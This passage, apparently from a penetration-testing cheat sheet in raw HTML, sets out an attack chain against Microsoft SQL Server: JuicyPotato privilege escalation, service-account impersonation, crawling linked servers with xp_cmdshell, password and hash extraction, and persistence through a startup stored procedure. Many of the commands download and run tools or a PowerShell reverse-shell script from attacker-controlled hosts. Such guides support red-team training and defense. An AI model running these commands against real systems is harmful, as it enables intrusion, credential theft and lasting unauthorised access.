&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">wget &lt;/span>&lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">50&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">51&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">juicy-potato&lt;/span>&lt;span class="n">-master&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">JuicyPotato&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">JuicyPotato&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-UseBasicParsing&lt;/span> &lt;span class="n">-Outfile&lt;/span> &lt;span class="n">juicypotato&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">EXEC&lt;/span> &lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="py">xp_cmdshell&lt;/span> &lt;span class="s1">&amp;#39;powershell -ep bypass -c wget &amp;#39;&amp;#39;http://192.168.50.53:8888/JuicyTomato.exe&amp;#39;&amp;#39; -OutFile c:\Users\Public\JuicyTomato.exe&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># own&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">./&lt;/span>&lt;span class="n">juicypotato&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Windows&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">System32&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-a&lt;/span> &lt;span class="s2">&amp;#34;/c net localgroup Administrators DOMAIN\USER /add&amp;#34;&lt;/span> &lt;span class="n">-l&lt;/span> &lt;span class="mf">8000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">EXEC&lt;/span> &lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="py">xp_cmdshell&lt;/span> &lt;span class="s1">&amp;#39;powershell -ep bypass -c c:\users\public\JuicyTomato.exe -t * -p c:\Windows\System32\cmd.exe -a &amp;#39;&amp;#39;/c net localgroup Administrators usfun\pastudent53 /add&amp;#39;&amp;#39; -l 8000&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="local-admin-to-sysadmin">Local Admin to Sysadmin&lt;/h3>
&lt;p>Extract service account credentials from LSA Secrets and/or memory, Token Impersonation for the SQL Server service, single user mode etc. are very well known methods.&lt;/p>
&lt;p>Impersonating the SQL Server service account (sysadmin) using the PowerUpSQL function InvokeSQLImpersonateService that wraps Joe Bialek’s Invoke-TokenManipulation:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLImpersonateService&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="lateral-movement">Lateral Movement&lt;/h2>
&lt;p>Once we move to the OS layer by executing OS commands, it is possible to move laterally to spread our access. SQL Servers provide various possibilities for lateral movement:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Shared Service Accounts&lt;/strong> = Domain user or Domain admin (OS layer)&lt;/li>
&lt;li>&lt;strong>SQL Server Links&lt;/strong> = Move laterally in the database layer&lt;/li>
&lt;/ul>
&lt;h3 id="shared-service-accounts">Shared Service Accounts&lt;/h3>
&lt;p>&lt;strong>Why should I care about SQL Servers that share service accounts?&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>SysAdmins can execute OS commands&lt;/li>
&lt;li>OS commands run as the SQL Server service account&lt;/li>
&lt;li>Service accounts have sysadmin privileges by default&lt;/li>
&lt;li>Companies often use a single domain account to run hundreds of SQL Servers&lt;/li>
&lt;li>So if you get sysadmin on one server you have it on all of them!&lt;/li>
&lt;/ul>
&lt;p>Check if current user has sa privs on a SQL instance:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLServerInfo&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Check for alternate creds:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">runas&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">noprofile&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">netonly&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">domain&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">powershell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLServerInfo&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Note that if we have access to hashes or tickets of any user, it always pay to check if that user is sysadmin on any database in the domain.&lt;/p>
&lt;p>A user with public (everyone) role can be used to enumerate domain accounts and groups in the forest and other trusted forests by fuzzing the values to SUSER_NAME function:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLFuzzDomainAccount&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1.cybercorp.local&amp;#34;&lt;/span> &lt;span class="n">-StartId&lt;/span> &lt;span class="mf">500&lt;/span> &lt;span class="n">-EndId&lt;/span> &lt;span class="mf">2000&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLFuzzDomainAccount&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-StartId&lt;/span> &lt;span class="mf">500&lt;/span> &lt;span class="n">-EndId&lt;/span> &lt;span class="mf">2000&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="sql-server-links">SQL Server Links&lt;/h3>
&lt;p>&lt;strong>What’s a SQL Server Link?&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Database links are basically persistent database connections for SQL Servers.&lt;/li>
&lt;li>A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources (Access, Excel, Oracle etc.).&lt;/li>
&lt;li>In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.&lt;/li>
&lt;li>Database links work across SQL server versions and even across forest trusts.&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Why should I care about SQL Server Links?&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Short answer = privilege escalation&lt;/li>
&lt;li>Links can be accessed by the public role via openquery&lt;/li>
&lt;li>Links are often configured with excessive privileges so they can allow you to impersonate logins on remote servers.&lt;/li>
&lt;li>xp_cmdshell and other command can be ran through&lt;/li>
&lt;li>Links can be crawled.&lt;/li>
&lt;/ul>
&lt;p>SQL Server links can be exploited by:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>HeidiSQL&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- Look for links to remote servers (public privs are enough)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">sysservers&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Run the same query on linked databases.Openquery() function can be used to run queries on a linked database
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">openquery&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;SQLServer2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;select * from master..sysservers&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Openquery queries can be chained to access links within links (nested links)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">openquery&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;SQLServer2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;select * from openquery(&amp;#34;SQLServer3&amp;#34;,&amp;#39;&amp;#39;select * from master..sysservers&amp;#39;&amp;#39;)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Hereafter, a long example of openquery
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">openquery&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ops-mssql&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;select * from openquery(&amp;#34;opsfile&amp;#34;,&amp;#39;&amp;#39;select * from openquery(&amp;#34;ops-sqlsrvprod&amp;#34;,&amp;#39;&amp;#39;&amp;#39;&amp;#39;select * from openquery(&amp;#34;dps-sqlreport&amp;#34;, &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;select * from openquery(&amp;#34;dps-mssql&amp;#34;,&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;select @@version as version;exec master..xp_cmdshell &amp;#34;powershell whoami&amp;#34;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;)&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;)&amp;#39;&amp;#39;&amp;#39;&amp;#39;)&amp;#39;&amp;#39;)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>xp_cmdshell&lt;/code> cannot be enabled on linked databases unless rpcout is enabled for all links (disabled by default), &lt;code>xp_cmdshell&lt;/code> can be enabled using:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- The query travels through the links and executes at the instance specified by AT
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">EXECUTE&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;sp_configure &amp;#39;&amp;#39;xp_cmdshell&amp;#39;&amp;#39;,1;reconfigure;&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;SQLServer2&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the initial SQL server, OS commands can be executed using nested link queries (&lt;strong>remember to double nested single quotes for escaping&lt;/strong>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">openquery&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;SQLServer2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;select * from openquery(&amp;#34;SQLServer3&amp;#34;,&amp;#39;&amp;#39;select * from openquery(&amp;#34;SQLServer4&amp;#34;,&amp;#39;&amp;#39;&amp;#39;&amp;#39;select @@version as version;exec master..xp_cmdshell &amp;#34;cmd /c calc.exe&amp;#34;&amp;#39;&amp;#39;&amp;#39;&amp;#39;)&amp;#39;&amp;#39;)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>PowerUpSQL&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Look for links to remote servers (public privs are enough)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerLink&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Enumerate database links. PowerUpSQL saves us from managing these pesky quotes: &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerLinkCrawl&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Execute the query on each server along the link&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerLinkCrawl&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;exec master..xp_cmdshell &amp;#39;cmd /c calc.exe&amp;#39;&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerLinkCrawl&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s2">&amp;#34;exec master..xp_cmdshell &amp;#39;cmd /c calc.exe&amp;#39;&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Instance&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">CustomQuery&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerLinkCrawl&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="s1">&amp;#39;exec master..xp_cmdshell &amp;#34;powershell iex (New-Object Net.WebClient).DownloadString(&amp;#39;&amp;#39;http://192.168.100.X:8080/InvokePowerShellTcpEx.ps1&amp;#39;&amp;#39;)&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>NetSPI Powershell Modules&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Extracting passwords from MSSQL instances&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Get-MSSQLCredentialPasswords&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psm1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-MSSQLCredentialPasswords&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Extracting passwords from database links&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Get-MSSQLLinkPasswords&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psm1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-MSSQLLinkPasswords&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Extracting all MSSQL passwords&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Get-MSSQLAllCredentials&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psm1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-MSSQLAllCredentials&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="persistence">Persistence&lt;/h2>
&lt;h3 id="sql-login-pw-hash-dumping">SQL Login PW Hash Dumping&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Returns logins from target SQL Servers&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerPasswordHash&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft &lt;/span>&lt;span class="n">-AutoSize&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="startup-stored-procedures">Startup Stored Procedures&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- Create a stored procedure (assuming xp_cmdshell is already enabled)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">USE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">PROCEDURE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_autops&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_cmdshell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;powershell -C &amp;#34;iex (new-object System.Net.WebClient).DownloadString(&amp;#39;&amp;#39;http://webserver/payload.ps1&amp;#39;&amp;#39;)&amp;#34;&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Mark the stored procedure for automatic execution
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_procoption&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">ProcName&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;sp_autops&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">OptionName&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;startup&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">OptionValue&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;on&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- To list stored procedures marked for automatic execution
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sysobjects&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">type&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;P&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AND&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">OBJECTPROPERTY&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;ExecIsStartUp&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Reference:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/" target="_blank" rel="noopener">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/&lt;/a>&lt;/li>
&lt;/ul>
&lt;h3 id="triggers">Triggers&lt;/h3>
&lt;p>A trigger is a special kind of stored procedure that automatically executes when an event occurs in the SQL Server.&lt;/p>
&lt;p>Reference: &lt;a href="https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>DDL triggers:&lt;/p>
&lt;p>Reference:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/" target="_blank" rel="noopener">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
